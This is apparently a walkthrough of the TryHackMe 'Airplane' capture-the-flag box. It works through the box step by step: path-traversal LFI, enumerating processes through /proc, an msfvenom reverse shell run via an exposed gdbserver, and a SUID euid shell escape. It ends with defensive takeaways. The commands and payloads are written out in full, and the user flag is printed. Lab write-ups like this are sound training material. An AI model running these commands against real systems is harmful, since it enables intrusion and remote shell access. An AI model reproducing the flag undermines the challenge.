---
title: "Airplane (TryHackMe) — Walkthrough: LFI to gdbserver RCE to SUID Lateral Move"
description: "TryHackMe Airplane walkthrough — turning a Flask LFI into process recon, exploiting an exposed gdbserver for RCE, then abusing a SUID euid mismatch to reach the user flag."
date: 2026-07-05 09:00:00 +0000
categories: [CTF]
tags: [ctf, tryhackme, linux, lfi, rce, gdbserver, privilege-escalation]
difficulty: Easy
---

> **Box:** TryHackMe — Airplane · **OS:** Linux (Ubuntu) · **Theme:** LFI → exposed gdbserver RCE → SUID lateral movement

Airplane is a genuinely instructive Linux box. A Flask app leaks files through an LFI, and that single bug is the key to everything — I used it not just to read `/etc/passwd`, but to fingerprint the running processes, which exposed a **gdbserver** listening to the world. That became my foothold, and a classic SUID trick moved me laterally to the user flag.

## Recon

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ rustscan -a 10.48.191.126 -- -A
Open 10.48.191.126:22
Open 10.48.191.126:6048
Open 10.48.191.126:8000
```

Trimming nmap to the essentials:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
```

Three ports:

- **22/tcp** — OpenSSH 8.2p1 (Ubuntu)
- **6048/tcp** — nmap could only guess `x11?`, but this turned out to be far more interesting *(spoiler: gdbserver)*
- **8000/tcp** — Werkzeug / Python 3.8 → a **Flask** web app

## Enumeration — Port 8000

The app immediately redirects to `http://airplane.thm:8000/?page=index.html`, so the first step was mapping the hostname:

```bash
echo "10.48.191.126 airplane.thm" | sudo tee -a /etc/hosts
```

A content scan turned up an `/airplane` endpoint:

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ feroxbuster -u http://airplane.thm:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
302      GET        5l       22w      269c http://airplane.thm:8000/ => http://airplane.thm:8000/?page=index.html
200      GET       35l       67w      655c http://airplane.thm:8000/airplane
```

But the real eye-catcher was that `?page=` parameter. Any time a page is loaded by name through a query string, **LFI** is the first thing I test.

## Local File Inclusion (LFI)

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ curl 'http://airplane.thm:8000/?page=./../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

It dumped `/etc/passwd` cleanly. Two human users stood out — **carlos** (uid 1000) and **hudson** (uid 1001).

## Turning LFI into recon — finding the gdbserver

LFI reads a lot more than config files — `/proc/<pid>/cmdline` reveals exactly what each process is running. I looped through PIDs to reconstruct the process table:

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ for i in {1..1000}; do out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found'); if [ -n "$out" ]; then echo "$i : $out"; fi; done
1 : /sbin/init splash
...
534 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
536 : /usr/bin/python3 app.py
574 : /opt/airplane
...
```

Buried in the output was the answer to that mystery port 6048 — an **exposed gdbserver** bound to all interfaces (`0.0.0.0:6048`). That's a direct remote code execution primitive.

## Foothold — exploiting gdbserver

The technique is standard: build an ELF reverse-shell payload, load it in a local gdb, then attach to the remote gdbserver and run it. `PrependFork=true` keeps the debugged process alive after the shell fires.

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.143.238 LPORT=443 PrependFork=true -f elf -o binary.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf
```

```bash
┌──(kali@kali)-[~/Desktop/THM/Airplane]
└─$ gdb binary.elf
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)
(gdb) target extended-remote airplane.thm:6048
Remote debugging using airplane.thm:6048
0x00007ffff7fd0100 in _start () from target:/lib64/ld-linux-x86-64.so.2
(gdb) run
```

With a listener waiting on port 443, the reverse shell landed.

## Lateral Movement → user.txt

Checking privileges revealed an interesting mismatch — running as **hudson**, but with **carlos** as the effective UID:

```bash
$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

That `euid` is the opening. A `find` that spawns a privilege-preserving shell (`-p`) drops me in as carlos, and the user flag is right there:

```bash
$ find . -exec /bin/sh -p \; -quit
$ cd /home/carlos
$ cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
```

## Privilege Escalation — root

*(This run's notes stop at the user flag.)* The natural next move from carlos is the first check I always run — `sudo -l` — to hunt for a root-runnable binary that can be abused via GTFOBins. I'll fill this section in once I've captured the root path.

## Takeaways

- **LFI is a Swiss Army knife.** It's not just `/etc/passwd` — reading `/proc/*/cmdline` mapped the entire process table and exposed the gdbserver that made this box.
- **gdbserver on `0.0.0.0` is game over.** An exposed debugger is remote code execution by design.
- **Watch the euid, not just the uid.** The privilege mismatch after the foothold is exactly what enabled the lateral move to carlos.
- **Defensive fixes:** sanitise file-path parameters (allowlist, block traversal), never bind gdbserver to public interfaces, and avoid SUID binaries that can spawn shells.
